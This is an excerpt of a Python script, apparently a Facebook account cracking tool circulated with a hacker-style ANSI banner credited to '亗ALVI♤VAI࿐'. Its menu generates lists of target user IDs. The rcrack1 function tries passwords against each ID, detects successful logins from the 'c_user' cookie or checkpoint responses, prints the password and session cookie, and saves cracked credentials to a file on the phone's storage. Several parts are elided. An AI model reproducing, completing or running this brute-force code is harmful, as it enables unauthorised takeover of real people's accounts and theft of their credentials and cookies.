...
╚═╝  ╚═╝╚══════╝ ╚═══╝  ╚═╝      ╚═══╝  ╚═╝  ╚═╝╚═╝
	       ...
	       \033[1;94m["WELCOME TO OUR world ðŸŒ"]
                                                           
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m CREATED BY\33[0;m   : \033[1;96m亗ALVI♤VAI࿐ 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m FACEBOK      : \033[1;34m亗ALVI♤VAI࿐  
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m GITHUB       : \033[1;35亗ALVI♤VAI࿐ 788-Cyber      
...
class Main:
    def __init__(self):
        ...
        Mumit =input(" \033[1;92m亗ALVI♤VAI࿐ : ")
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
...
def num():
    ...
    print(' [+] Ids saved in 亗ALVI♤VAI࿐-ok.txt,亗ALVI♤VAI࿐-cp.txt')
...
def gml():
    ...
    print(' [+] \033[38;5;46mIds saved in 亗ALVI♤VAI࿐-ok.txt,亗ALVI♤VAI࿐-cp.txt')
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m[\033[1;92m亗ALVI♤VAI࿐ ]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[亗ALVI♤VAI࿐-OK🐼] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/亗ALVI♤VAI࿐-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[\033[1;92m亗ALVI♤VAI࿐cp🍾] {uid}|{ps}")
                #open('/sdcard/\033[1;92m亗ALVI♤VAI࿐-cp.txt', 'a').write( uid+' | '+ps+' \n')
                #cps.append(uid)
                break
            else:
                continue
